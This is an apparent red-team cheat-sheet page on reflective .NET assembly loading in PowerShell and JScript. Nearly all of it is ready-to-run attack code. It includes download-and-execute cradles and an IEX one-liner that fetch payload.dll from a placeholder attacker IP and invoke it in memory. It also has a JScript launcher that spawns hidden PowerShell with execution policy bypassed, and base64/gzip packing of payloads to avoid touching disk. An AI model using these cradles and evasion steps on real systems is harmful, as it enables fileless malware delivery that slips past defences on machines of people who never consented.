---
tags:
  - Advanced
  - Defense_Evasion
  - Execution
  - PowerShell
  - Python
  - Reflective_Loading
  - Windows
---

## Reflective Assembly Loading
resources: [Microsoft Assembly.Load](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load)

> [!tip] Load .NET assemblies directly into memory without touching disk. Combine with JScript for fileless execution.

### PowerShell Assembly Loading

#### Load Assembly from Byte Array
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\assembly.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)
```

#### Load Assembly from Base64
```powershell
$base64 = "<Base64EncodedAssembly>"
$bytes = [Convert]::FromBase64String($base64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
```

#### Download and Load Assembly
```powershell
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData("http://<AttackerIP>/assembly.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)
```

### Invoke Loaded Assembly

#### Get Entry Point and Invoke
```powershell
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]]@()))
```

#### Invoke Specific Method
```powershell
$assembly = [System.Reflection.Assembly]::Load($bytes)
$type = $assembly.GetType("Namespace.ClassName")
$method = $type.GetMethod("MethodName")
$method.Invoke($null, @("arg1", "arg2"))
```

### JScript Reflective Loading

#### Load PowerShell from JScript
```javascript
var shell = new ActiveXObject("WScript.Shell");
var ps = "powershell -exec bypass -nop -w hidden -c \"";
ps += "$bytes=[Convert]::FromBase64String('<Base64Assembly>');";
ps += "$assembly=[System.Reflection.Assembly]::Load($bytes);";
ps += "$assembly.EntryPoint.Invoke($null,(,[string[]]@()))\"";
shell.Run(ps, 0, false);
```

### Cradle for Remote Assembly Loading

#### Complete Download and Execute Cradle
```powershell
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$bytes = $wc.DownloadData("http://<AttackerIP>/payload.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (, [string[]]@()))
```

#### One-Liner Version
```powershell
IEX([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<AttackerIP>/payload.dll')).EntryPoint.Invoke($null,(,[string[]]@())))
```

### Encoding Assembly for Transport [Local]

#### Base64 Encode Assembly
```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
$base64 = [Convert]::ToBase64String($bytes)
$base64 | Out-File -Encoding ASCII payload_b64.txt
```

#### Compress and Encode
```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
$ms = New-Object System.IO.MemoryStream
$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$gs.Write($bytes, 0, $bytes.Length)
$gs.Close()
$compressed = $ms.ToArray()
$base64 = [Convert]::ToBase64String($compressed)
```

#### Decompress at Runtime
```powershell
$compressed = [Convert]::FromBase64String("<Base64CompressedAssembly>")
$ms = New-Object System.IO.MemoryStream(, $compressed)
$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$outMs = New-Object System.IO.MemoryStream
$gs.CopyTo($outMs)
$bytes = $outMs.ToArray()
$assembly = [System.Reflection.Assembly]::Load($bytes)
```
